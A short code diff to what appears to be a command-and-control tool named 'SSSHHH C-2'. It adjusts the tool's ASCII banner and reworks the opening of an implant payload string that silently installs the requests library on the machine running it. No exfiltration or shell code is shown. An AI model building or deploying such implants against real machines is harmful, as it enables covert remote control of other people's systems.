@@ -75,10 +75,10 @@ def ssshhh():
     print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)
     print(m.bcolors.BOLD + m.bcolors.BLUE + """
         *******************************************************************
-        _   _   _   _   _   _      _  
-       / \ / \ / \ / \ / \ / \    / \  
-      ( S | S | S | H | H | H ) ( C-2 )
-       \_/ \_/ \_/ \_/ \_/ \_/    \_/ 
+         _   _   _   _   _   _      _  
+        / \ / \ / \ / \ / \ / \    / \  
+       ( S | S | S | H | H | H ) ( C-2 )
+        \_/ \_/ \_/ \_/ \_/ \_/    \_/ 
     """ + m.bcolors.ENDC)
 
     print(
@@ -186,11 +186,12 @@ if __name__ == '__main__':
     payload = """import os                                                                                                                                        
 try:                                                                                                                                                              
     os.system("pip3 install requests")                                                                                                                            
-except:                                                                                                                                                           
-    try:                                                                                                                                                          
-        os.system("pip install requests")                                                                                                                         
-    except:                                                                                                                                                       
-        pass                                                                                                                                                      
+except:
+    pass                                                                                                                                                           
+try:                                                                                                                                                          
+    os.system("pip install requests")                                                                                                                         
+except:                                                                                                                                                       
+    pass                                                                                                                                                      
 import requests                                                                                                                                                   
 
 
